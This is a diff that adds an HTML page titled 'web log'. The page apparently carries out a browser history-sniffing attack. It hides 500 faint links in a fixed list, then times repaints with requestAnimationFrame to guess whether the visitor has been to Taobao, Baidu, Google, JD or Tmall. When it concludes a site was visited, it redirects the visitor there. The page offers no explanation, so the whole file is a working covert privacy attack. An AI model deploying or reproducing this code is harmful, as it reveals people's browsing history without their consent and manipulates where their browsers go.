@@ -1,0 +1,146 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<title>web log </title>
+	<script src="http://libs.baidu.com/jquery/1.9.0/jquery.js"></script>
+	<style>
+		ul{
+			list-style-type:none;
+		}
+		ul#test-area {
+			position: fixed;
+			right: 0px;
+			opacity: 0.1;
+			float: right;
+		}
+		ul#test-area a {
+			color: #fff;
+			text-shadow: 5px 5px 500px #999;
+		}
+	</style>
+	<script type="text/javascript">
+//		var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+//		document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fe99baf24f819fcd0a35adeec04e55b97' type='text/javascript'%3E%3C/script%3E"));
+	</script>
+</head>
+<body>
+
+	<ul id="test-area"></ul>
+<script>
+	(function () {
+//		var known_visited_url = "http://oldj.net/static/history-sniffing/test.html";
+		var known_visited_url = location.href;
+		var index=0;
+		var load = [
+			"http://www.taobao.com",
+			"http://www.baidu.com",
+			"http://www.google.com",
+			"http://www.jd.com",
+			"http://www.tmall.com"
+		];
+		var links = [
+			"http://www.taobao.com",
+			"http://www.baidu.com",
+			"http://www.google.com",
+			"http://www.jd.com",
+			"http://www.tmall.com"
+		];
+		var last_time = 0;
+		var current_is_visited = false;
+		var min_large_time = -1;
+
+		function checkIsLinkVisted(url, callback) {
+			var i_count = 10;
+			var times = [];
+//			$("#test-area a").each(function () {
+//				this.href = known_visited_url;
+//			});
+
+			function check(time) {
+				var delay = parseInt(time - last_time);
+				times.push(delay);
+				last_time = time;
+				if (i_count > 0) {
+					requestAnimationFrame(check);
+				} else {
+					checkEnd();
+				}
+				i_count--;
+			}
+
+			function checkEnd() {
+				var large_time_count = 0;
+				var large_time = 60;
+
+				for (var i = 0; i < times.length; i++) {
+					if (times[i] > large_time) large_time_count++;
+				}
+				console.log(times);
+
+				if (min_large_time == -1) {
+					min_large_time = large_time_count;
+					if (min_large_time < 2) min_large_time = 2;
+					current_is_visited = true;
+				} else if (large_time_count >= min_large_time) {
+					current_is_visited = !current_is_visited;
+				}
+
+				// $("#links").append("<li class='"
+				// 		+ (current_is_visited ? "visited" : "unvisited") + "'>"
+				// 		+ (current_is_visited ? "[v]" : "[ ]") + " "
+				// 		+ "<a href='" + url + "'>"
+				// 		+ url + "</a>"
+				// 		+ "<span class='time'>"
+				// 		+ times.join(", ")
+				// 		+ "</span>"
+				// 		+ "</li>");
+				if(current_is_visited)
+					location.href=load[index];
+					//alert("aaa");
+				if (callback && typeof callback == "function") callback();
+			}
+
+			setTimeout(function () {
+				$("#test-area a").each(function () {
+					this.href = url;
+					this.style.color = "red";
+					this.style.color = "";
+				});
+				requestAnimationFrame(check);
+			}, 500);
+		}
+
+		function initTestArea() {
+			var htmls = [];
+			for (var i = 0; i < 500; i++) {
+				htmls.push("<li><a href='" + known_visited_url + "'>###########</a></li>");
+			}
+			$("#test-area").append(htmls.join("\n"));
+
+		}
+
+		function checkByTurn(list) {
+			var current = list.shift();
+
+			if (current) {
+				checkIsLinkVisted(current, function () {
+					index++;
+					checkByTurn(list);
+				});
+			} else {
+//				$("#test-area").html("");
+				$("#operation").slideDown();
+			}
+		}
+
+		$(document).ready(function () {
+			initTestArea();
+			checkByTurn(links);
+//		checkIsLinkVisted(links[3]);
+		});
+	})();
+</script>
+</body>
+</html>
